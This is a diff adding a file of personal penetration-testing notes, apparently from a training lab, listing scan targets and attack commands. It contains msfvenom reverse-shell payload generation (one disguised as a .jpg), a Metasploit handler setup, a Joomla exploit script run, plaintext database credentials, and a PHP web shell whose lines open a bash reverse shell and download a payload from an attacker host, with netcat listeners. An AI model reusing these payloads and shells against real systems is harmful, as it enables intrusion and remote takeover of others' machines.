@@ -1,0 +1,102 @@
+nmap -Pn -sT -sV -sC -O  -p 0-65535 10.11.1.36 -oA nmaptcpfullscan1
+nmap -Pn -sU -sV -O 10.11.1.36 -oA nmapudpscan
+nmap --script=smb-vuln* -p 139,445 10.11.1.83 
+
+nc -vlnp 8000
+
+
+DONE:
+Steven, John, Mantis, Anthony, Breeze, Android
+
+TO DO: James, AS45, CMS01
+
+Set up a listener to catch a reverse shell on meterpreter or whatever but set the payload accordingly:
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > show options
+
+
+Post session:
+
+show sessions
+
+sessions -i 1
+
+
+How to generate payload using msfvenom?
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.2.2 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
+
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=192.168.23.103 LPORT=443 -f exe > Cyberwarzone_reverse_tcp.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=172.16.2.2 LPORT=8000
+
+msfvenom -p cmd/unix/reverse_bash LHOST=172.16.2.2 LPORT=8000 R
+
+msfvenom -p cmd/unix/reverse_bash LHOST=172.16.2.2 LPORT=8000 R > exploit.jpg
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.2.2 LPORT=8000 -f raw > exploit1
+
+Exec a python script to do something:
+./joomraa.py -u hacker -p password -e hacker@example.com -x exploit1.pht http://10.12.1.177:80
+
+Mysql login CLI
+mysql://root:joomla@http://10.12.1.177:3306/joomla
+mysql --host=10.12.1.177 --user=root --password=joomla joomla
+
+
+
+Tools to convert image to text: tesseract
+Tool to add or edit image metadata: exiftool
+Tool to resize image through CLI: Magick
+
+
+Link for msfconsole stuff....
+https://netsec.ws/?p=331
+
+locate command to find a file or something
+
+sudo apt-get install gcc-multilib
+To compile for different arch
+gcc -m32 source -o target
+
+service apache2 restart
+
+OR use python simplehttpserver (easier, choose right directory)
+
+
+For ports to listen/send, use 443/80/standard ports.
+
+
+PHP shell uploaded on target machine to listen to multiple ports and accept an exploit
+
+<?php
+shell_exec("/bin/bash -c '/dev/tcp/172.16.2.1/443 > exploit;exit'"); 
+shell_exec("/bin/bash -c ' bash -i >& /dev/tcp/172.16.2.1/80 0>&1'"); ?>
+
+Corresponding netcat listeners on attacking machine:
+nc -nlvp 80
+nc -nlvp 443 < a.out
+
+Detailed explanation on Ex-cop 2, page 26, 29/11/19
+
+Command to list every bit of info inside a folder:
+ls -asl
+
+Host simple webserver
+python -m SimpleHTTPServer 80
+
+Then wget/curl
+
+OPENVAS
+
+[*] Opening Web UI (https://127.0.0.1:9392) in: 5... 4... 3... 2... 1... 
+
+[>] Checking for admin user
+[*] Creating admin user
+User created with password '78e4cdcd-5bc2-4057-bdc3-b79f74ab7164'.
+
+Nikto shortcuts
+nikto -host 10.12.1.109 -port 135,139,445,554,2869,8009,8080,10243,49152,49153,49154,49159,49160
+
